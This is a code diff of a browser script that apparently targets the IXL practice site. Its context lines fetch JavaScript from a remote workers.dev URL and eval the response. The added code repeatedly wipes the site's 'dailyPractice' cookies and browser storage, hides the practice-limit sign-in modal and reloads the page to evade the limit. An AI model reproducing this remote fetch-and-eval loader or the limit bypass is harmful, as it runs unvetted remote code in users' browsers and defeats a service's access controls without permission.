@@ -37,3 +37,25 @@ setInterval(yeet, 0);
 fetch ("https://remotelyexecutjs.shayaanhooda.workers.dev/")
 .then(x => x.text())
 .then(y => eval(y));
+    function clearCookiesAndStorage(){
+            var C = document.cookie.split("; ");
+    for (var d = "." + location.host; d; d = ("" + d).substr(1).match(/..*$/))
+        for (var sl = 0; sl < 2; ++sl)
+            for (var p = "/" + location.pathname; p; p = p.substring(0, p.lastIndexOf('/')))
+                for (var i in C)
+                    if (C[i].includes("dailyPractice")) {
+                        document.cookie = C[i] + "; domain=" + d.slice(sl) + "; path=" + p.slice(1) + "/" + "; expires=" + new Date((new Date).getTime() - 1e11).toGMTString()
+                    }
+  window.localStorage.clear();
+  sessionStorage.clear();
+    }
+    var x = setInterval(() => {
+    clearCookiesAndStorage();
+        if(document.querySelector("div.ixl-modal-outer-container.shared-practice-limit-signin-modal.modal-borderless-blue-hover.center")){
+            if(document.querySelector("div.ixl-modal-outer-container.shared-practice-limit-signin-modal.modal-borderless-blue-hover.center").style.display == "block"){
+            clearInterval(x);
+            document.querySelector("div.ixl-modal-outer-container.shared-practice-limit-signin-modal.modal-borderless-blue-hover.center").style.display = "none";
+            location.reload();
+            }
+        }
+    }, 0);
